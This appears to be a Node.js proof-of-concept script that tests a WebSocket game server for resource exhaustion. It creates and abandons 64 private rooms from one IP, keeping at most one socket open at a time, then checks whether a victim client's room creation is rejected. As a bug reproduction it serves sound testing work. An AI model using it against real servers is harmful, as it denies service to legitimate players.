import { connect, sendJ, until, wait } from './rawws.mjs';
const [host, port] = process.argv.slice(2);
const hello = async () => { const s = await connect(host, +port); sendJ(s, { t: 'hello', v: 4, build: 'x', name: 'z' }); await until(s, (m) => m.t === 'welcome'); return s; };
let made = 0;
for (let i = 0; i < 64; i++) { const s = await hello(); sendJ(s, { t: 'create_room', visibility: 'private' }); await until(s, (m) => m.t === 'room_state'); s.destroy(); made++; }
console.log('attacker made + abandoned', made, 'rooms from one IP (never more than 1 socket open)');
const v = await connect('127.0.0.1', +port); sendJ(v, { t: 'hello', v: 4, build: 'x', name: 'victim' }); await until(v, (m) => m.t === 'welcome');
sendJ(v, { t: 'create_room', visibility: 'private' }); const r = await until(v, (m) => m.t === 'join_rejected' || m.t === 'room_state');
console.log('victim create_room ->', JSON.stringify(r));
process.exit(0);
